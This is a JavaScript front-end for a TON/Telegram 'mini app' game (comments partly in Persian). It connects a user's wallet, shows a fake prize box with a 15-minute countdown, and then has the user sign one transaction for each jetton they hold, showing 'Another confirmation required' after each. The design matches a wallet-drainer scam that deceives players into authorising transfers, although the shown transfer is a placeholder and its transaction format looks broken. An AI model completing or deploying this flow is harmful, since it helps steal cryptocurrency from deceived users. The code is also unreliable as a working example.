let ui;
let walletAddress = null;
let timerInterval;
let jettonsToClaim = [];
let currentIndex = 0;

// ---------- Connect Wallet ----------
document.getElementById("connectBtn").onclick = () => {
    try {
        ui = new TonConnectUI.TonConnectUI({
            manifestUrl: "https://emperator16.github.io/miniapp/manifest.json"
        });

        // نمایش اتصال به والت (modal خود TonConnect)
        ui.walletSelect(); 

        // event listener برای تغییر وضعیت Wallet
        ui.onStatusChange((status) => {
            if (status.type === 'connected') {
                walletAddress = status.account.address;
                console.log("Wallet connected:", walletAddress);
                alert("Wallet connected: " + walletAddress);

                document.getElementById("connectDiv").style.display = "none";
                document.getElementById("gameDiv").style.display = "block";

                fetchUserJettons(walletAddress).then(jettons => {
                    jettonsToClaim = jettons;
                });
            }
        });

    } catch(e) {
        console.error("Connection failed:", e);
        alert("Wallet connection failed. Make sure you are in Telegram or on mobile with Tonkeeper.");
    }
};

// ---------- Play Game ----------
document.getElementById("playBtn").onclick = () => {
    document.getElementById("gameDiv").style.display = "none";
    document.getElementById("rewardDiv").style.display = "block";
    document.getElementById("animationDiv").innerHTML = '<img src="images/box-open.gif">';
    startTimer(15 * 60); // 15 دقیقه
};

// ---------- Timer ----------
function startTimer(duration) {
    let time = duration;
    timerInterval = setInterval(() => {
        let minutes = Math.floor(time / 60);
        let seconds = time % 60;
        document.getElementById("timer").textContent =
            `${minutes.toString().padStart(2,'0')}:${seconds.toString().padStart(2,'0')}`;
        if (--time < 0) {
            clearInterval(timerInterval);
            alert("Time expired! Claim window closed.");
            document.getElementById("rewardDiv").style.display = "block";
            document.getElementById("gameDiv").style.display = "block";
        }
    }, 1000);
}

// ---------- Claim Reward ----------
document.getElementById("claimBtn").onclick = async () => {
    document.getElementById("rewardDiv").style.display = "none";
    await processNextClaim();
};

async function processNextClaim() {
    if(currentIndex >= jettonsToClaim.length) {
        clearInterval(timerInterval);
        document.getElementById("claimDiv").style.display = "none";
        document.getElementById("confettiDiv").style.display = "block";
        setTimeout(() => {
            document.getElementById("confettiDiv").style.display = "none";
            document.getElementById("successDiv").style.display = "block";
        }, 3000);
        return;
    }

    document.getElementById("claimDiv").style.display = "block";

    try {
        const jetton = jettonsToClaim[currentIndex];

        // امضا با پرداخت فقط کارمزد
        let payload = {
            type: "transfer",
            to: walletAddress,
            amount: 0,
            payload: "0x1234"
        };

        await ui.sendTransaction(payload);

        currentIndex++;
        document.getElementById("claimDiv").style.display = "none";

        if(currentIndex < jettonsToClaim.length) {
            alert("Another confirmation required");
            await processNextClaim();
        } else {
            document.getElementById("confettiDiv").style.display = "block";
            setTimeout(() => {
                document.getElementById("confettiDiv").style.display = "none";
                document.getElementById("successDiv").style.display = "block";
            }, 3000);
        }

    } catch(e) {
        alert("Transaction failed or cancelled.");
        document.getElementById("rewardDiv").style.display = "block";
    }
}

// ---------- Play Again ----------
document.getElementById("playAgainBtn").onclick = () => {
    document.getElementById("successDiv").style.display = "none";
    document.getElementById("gameDiv").style.display = "block";
};

// ---------- Fetch Jettons ----------
async function fetchUserJettons(address) {
    // جای RPC یا Toncenter API قرار دهید
    return [
        {address: '0:abc123...', amount: 1},
        {address: '0:def456...', amount: 1}
    ];
}
